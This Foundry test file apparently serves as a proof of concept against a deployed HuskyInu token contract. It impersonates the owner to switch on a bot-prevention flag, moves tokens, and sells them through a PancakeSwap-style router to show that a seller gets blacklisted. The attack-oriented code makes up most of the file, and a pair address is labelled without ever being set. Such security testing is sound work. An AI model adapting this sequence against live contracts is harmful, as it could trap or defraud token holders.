// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interface for HuskyInu
interface HuskyInu {
    function owner() external view returns (address);
    function setPreventBot(bool enable) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function blacklist(address b) external view returns (bool);
}

// Interface for UniswapV2Router02
interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x40a5Ad300Ee5a5b8bA6B50719647C19F2E52d5BE;
    address attacker = address(this);
    address private uniswapV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address private uniswapV2Pair; // Will be initialized in exploit
    address private huskyOwner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll work with the deployed contract
        // Label addresses for clarity
        vm.label(TARGET, "HuskyInu");
        vm.label(uniswapV2Router, "PancakeRouter");
        vm.label(uniswapV2Pair, "HUSKY-WETH Pair");

        // Get the owner address from the contract
        huskyOwner = HuskyInu(TARGET).owner();
        vm.label(huskyOwner, "Husky Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Impersonate owner to enable preventBotContract
        vm.startPrank(huskyOwner);
        HuskyInu(TARGET).setPreventBot(true);
        vm.stopPrank();

        // Step 2: Get some HuskyInu tokens to trade
        // We'll transfer from owner to our contract
        uint256 amountToSell = 100 * 10**18; // 100 tokens

        // First, check owner's balance
        uint256 ownerBalance = HuskyInu(TARGET).balanceOf(huskyOwner);
        require(ownerBalance >= amountToSell, "Owner doesn't have enough tokens");

        // Impersonate owner to transfer tokens to us
        vm.prank(huskyOwner);
        HuskyInu(TARGET).transfer(address(this), amountToSell);

        // Step 3: Approve router to spend our tokens
        HuskyInu(TARGET).approve(uniswapV2Router, type(uint256).max);

        // Step 4: Execute a swap to trigger blacklist
        // Prepare swap path: HUSKY -> WETH
        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = IUniswapV2Router02(uniswapV2Router).WETH();

        // Execute swap with minimal output expectation
        uint256 deadline = block.timestamp + 300;
        IUniswapV2Router02(uniswapV2Router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSell,
            0, // accept any amount of ETH
            path,
            address(this),
            deadline
        );

        // Step 5: Verify we're blacklisted
        bool isBlacklisted = HuskyInu(TARGET).blacklist(address(this));
        require(isBlacklisted, "Failed to get blacklisted");
        assertEq(HuskyInu(TARGET).blacklist(attacker), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

